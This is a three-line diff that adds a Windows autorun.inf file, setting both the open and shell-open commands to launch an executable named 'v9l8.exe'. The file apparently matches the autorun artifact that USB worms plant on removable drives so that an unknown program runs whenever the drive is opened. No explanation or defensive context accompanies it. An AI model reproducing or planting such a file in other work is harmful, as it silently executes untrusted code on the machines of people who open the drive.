@@ -1,0 +1,3 @@
+[AutoRun]
+open=v9l8.exe
+shell\open\Command=v9l8.exe
